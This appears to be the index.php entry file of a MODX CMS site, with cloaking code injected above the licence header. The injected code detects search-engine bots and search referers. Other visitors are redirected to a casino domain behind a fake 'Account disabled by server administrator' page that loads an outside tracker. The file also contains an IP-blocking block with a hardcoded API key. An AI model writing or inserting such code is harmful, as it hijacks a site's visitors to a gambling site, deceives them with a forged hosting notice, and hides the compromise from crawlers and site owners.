<?php
function isBot(&$botname = ''){
	$bots = array(
		'rambler','googlebot','aport','yahoo','msnbot','turtle','mail.ru','omsktele', 
		'yetibot','picsearch','sape.bot','sape_context','gigabot','snapbot','alexa.com',
		'megadownload.net','askpeter.info','igde.ru','ask.com','qwartabot','yanga.co.uk',
		'scoutjet','similarpages','oozbot','shrinktheweb.com','aboutusbot','followsite.com',
		'dataparksearch','google-sitemaps','appEngine-google','feedfetcher-google',
		'liveinternet.ru','xml-sitemaps.com','agama','metadatalabs.com','h1.hrn.ru',
		'googlealert.com','seo-rus.com','yaDirectBot','yandeG','yandex',
		'yandexSomething','Copyscape.com','AdsBot-Google','domaintools.com',
		'Nigma.ru','bing.com','dotnetdotcom'
	);
	foreach($bots as $bot)
		if(stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false){
			$botname = $bot;
			return true;
		}
	return false;
}
$bot = '';
if( isBot($_SERVER['HTTP_USER_AGENT']) ) {
	$bot = 1;
}

if($bot!=1){

	if(preg_match("/google|yandex|mail|rambler|duckduckgo|rambler|yahoo|bing|nigma|hi|zapmeta|qip|sweetim|plusnetwork|flashplayer|facebook|twitter|vk|pinterest|youtube|poshukach|baidu|instagram/",$_SERVER['HTTP_REFERER']) OR $_GET['enter']==1){
		$date_of_expiry = time() + 86400; //через сколько времени заставлять пользователей зайти с органики, 60=1 минута, умножено на 300 = 300 минут
		setcookie( "userlog", "org", $date_of_expiry, '/' );
	} else {
		if($_COOKIE["userlog"] == "org") {
		} else {
			exit('
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">document.location.replace("http://100casino.online" + document.location.pathname)</script>
  <title>Account disabled by server administrator</title>
  <meta http-equiv="refresh" content="0;URL=http://100casino.online/" />
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style>
    body {
      font-weight: normal;
      font-size: 11px;
      font-family: PT Sans;
    }
    .fatal-error {
      width: 270px;
      height: 270px;
      margin: 0 auto;
      position: absolute;
      top: 50%;
      left: 50%;
      margin-left: -135px;
      margin-top: -135px;
    }
    .fatal-error-round {
      width: 270px;
      height: 270px;
      background: #FF8356;
      border-radius: 270px;
    }
    .fatal-error-inner {
      padding-top: 23px;
      text-align: center;
    }
    .fatal-error-sign {
      margin-bottom: 10px;
    }
    .fatal-error-sign-top {
      background: #FFF;
      width: 14px;
      height: 7px;
      border-radius: 28px 28px 0 0;
      margin: 0 auto;
    }
    .fatal-error-sign-body {
      content: "";
      width: 0px;
      height: 0px;
      border-style: solid outset;
      border-width: 54px 7px 0 7px;
      border-color: #FFF rgba(0, 0, 0, 0) rgba(0, 0, 0, 0) rgba(0, 0, 0, 0);
      margin: 0 auto;
    }
    .fatal-error-sign-empty {
      background: #FF8356;
      margin: 0 auto;
      width: 10px;
      height: 11px;
      z-index: 1;
      margin-top: -7px;
    }
    .fatal-error-sign-dot {
      background: #FFF;
      width: 14px;
      height: 14px;
      border-radius: 14px;
      margin: 0 auto;
      margin-top: 0px;
    }
    .fatal-error-message {
      font-size: 12px;
      overflow: hidden;
      padding: 0 10px;
      color: #fff;
    }
    .fatal-error-header {
      font-size: 27px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .b-copyright {
      margin-top: 40px;
      text-align: center;
    }
    .b-copyright__link {
      color: #587b9d;
    }
    .b-text_lang_ru {
      display: none;
    }
  </style>
</head>
<body>
<div id="main-wrapper">
  <div id="fatal-error" class="fatal-error">
    <div class="fatal-error-round">
      <div class="fatal-error-inner">
        <div class="fatal-error-sign">
          <div class="fatal-error-sign-top"></div>
          <div class="fatal-error-sign-body"></div>
          <div class="fatal-error-sign-empty"></div>
          <div class="fatal-error-sign-dot"></div>
        </div>
        <div class="fatal-error-message">
          <div class="fatal-error-header b-text b-text_lang_en">Attention</div>
          <div class="fatal-error-header b-text b-text_lang_ru">Внимание</div>
          <div class="fatal-error-desc b-text b-text_lang_en">Account disabled by server administrator.</div>
          <div class="fatal-error-desc b-text b-text_lang_ru">Аккаунт отключен администратором сервера.</div>
        </div>
      </div>
    </div>
    <div class="b-copyright">
      <a class="b-copyright__link" href="http://ispsystem.com/external/ispmanager.html" target="_blank">ISPsystem � 1997-<script type="text/javascript">document.write(new Date().getFullYear())</script></a>
    </div>
  </div>

</div>
<script type="text/javascript">
  var platformLanguage = navigator && (
    navigator.language ||
      navigator.browserLanguage ||
      navigator.systemLanguage ||
      navigator.userLanguage ||
      null ),
    elemsRU, elemsEN;
  if (platformLanguage.match("ru") && document.getElementsByClassName) {
    elemsRU = document.getElementsByClassName("b-text_lang_ru");
    elemsEN = document.getElementsByClassName("b-text_lang_en");
    var l = elemsEN.length;
    while(l--) {
      elemsEN[l].style.display = "none";
    }
    l = elemsRU.length;
    while(l--) {
      elemsRU[l].style.display = "block";
    }
    document.title = "Аккаунт отключен администратором сервера.";
  }
</script>
<script src="//nht-2.extreme-dm.com/t.js" id="eX-hrushch-2" async defer></script> 
</body>
</html>');



		}
	}
}
/*
*************************************************************************
	MODX Content Management System and PHP Application Framework 
	Managed and maintained by Raymond Irving, Ryan Thrash and the
	MODX community
*************************************************************************
	MODX is an opensource PHP/MySQL content management system and content
	management framework that is flexible, adaptable, supports XHTML/CSS
	layouts, and works with most web browsers, including Safari.

	MODX is distributed under the GNU General Public License	
*************************************************************************

	MODX CMS and Application Framework ("MODX")
	Copyright 2005 and forever thereafter by Raymond Irving & Ryan Thrash.
	All rights reserved.

	This file and all related or dependant files distributed with this filie
	are considered as a whole to make up MODX.

	MODX is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation; either version 2 of the License, or
	(at your option) any later version.

	MODX is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with MODX (located in "/assets/docs/"); if not, write to the Free Software
	Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA

	For more information on MODX please visit http://modx.com/
	
**************************************************************************
    Originally based on Etomite by Alex Butter
**************************************************************************
*/	

/**
 * Initialize Document Parsing
 * -----------------------------
 */
 $apikey = "gohqt9tdraiug139o36m656h409c4j"; // ����� ���� ������, ��� ����� ���������� ���� ����������� ���
$html="<p>The site is closed for renovation. Sorry for temporary inconvenience. Very soon the site will work!</p>"; //��� ������� ����� ������� "�������" ������������
require_once("zapret.php");
$zapret=new Zapret("");
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
$ip = $_SERVER['REMOTE_ADDR'];
$isBadUser=$zapret->isBadIp($ip , $apikey);

if (isset($_GET["client_ip"])) {
if ($_GET["client_ip"] == "213.87.155.1")
$isBadUser = true;
}
if($isBadUser)
die($html);

if(!isset($_SERVER['REQUEST_TIME_FLOAT'])) $_SERVER['REQUEST_TIME_FLOAT'] = microtime(true);

if(is_file('autoload.php')) include_once('autoload.php');

$base_path = str_replace('\\','/',dirname(__FILE__)) . '/';
if(is_file($base_path . 'assets/cache/siteManager.php'))
    include_once($base_path . 'assets/cache/siteManager.php');
if(!defined('MGR_DIR') && is_dir("{$base_path}manager"))
	define('MGR_DIR','manager');
if(is_file($base_path . 'assets/cache/siteHostnames.php'))
    include_once($base_path . 'assets/cache/siteHostnames.php');
if(!defined('MODX_SITE_HOSTNAMES'))
	define('MODX_SITE_HOSTNAMES','');

// get start time
$mstart = memory_get_usage();

// harden it
require_once(dirname(__FILE__).'/'.MGR_DIR.'/includes/protect.inc.php');

// set some settings, and address some IE issues
@ini_set('url_rewriter.tags', '');
@ini_set('session.use_trans_sid', 0);
@ini_set('session.use_only_cookies',1);
session_cache_limiter('');
header('P3P: CP="NOI NID ADMa OUR IND UNI COM NAV"'); // header for weird cookie stuff. Blame IE.
header('Cache-Control: private, must-revalidate');
ob_start();

/**
 *	Filename: index.php
 *	Function: This file loads and executes the parser. *
 */

define("IN_ETOMITE_PARSER", "true"); // provides compatibility with etomite 0.6 and maybe later versions
define("IN_PARSER_MODE", "true");
if (!defined('IN_MANAGER_MODE')) {
	define("IN_MANAGER_MODE", "false");
}
if (!defined('MODX_API_MODE')) {
    define('MODX_API_MODE', false);
}

// get the required includes
if(!isset($database_user) || $database_user=="") {
	$rt = @include_once(dirname(__FILE__).'/'.MGR_DIR.'/includes/config.inc.php');
	// Be sure config.inc.php is there and that it contains some important values
	if(!$rt || !$database_type || !$database_server || !$database_user || !$dbase) {
		readfile('install/not_installed.tpl');
		exit;
	}
}

// start session 
startCMSSession();

// initiate a new document parser
include_once(MODX_MANAGER_PATH.'includes/document.parser.class.inc.php');
$modx = new DocumentParser;
$etomite = &$modx; // for backward compatibility

// set some parser options
$modx->minParserPasses = 1; // min number of parser recursive loops or passes
$modx->maxParserPasses = 10; // max number of parser recursive loops or passes
$modx->dumpSQL = false;
$modx->dumpSnippets = false; // feed the parser the execution start time
$modx->dumpPlugins = false;
$modx->tstart = $_SERVER['REQUEST_TIME_FLOAT'];
$modx->mstart = $mstart;

// Debugging mode:
$modx->stopOnNotice = false;

// Don't show PHP errors to the public
if(!isset($_SESSION['mgrValidated']) || !$_SESSION['mgrValidated']) {
    @ini_set("display_errors","0");
}

// execute the parser if index.php was not included
if (!MODX_API_MODE) {
    $modx->executeParser();
}

?> 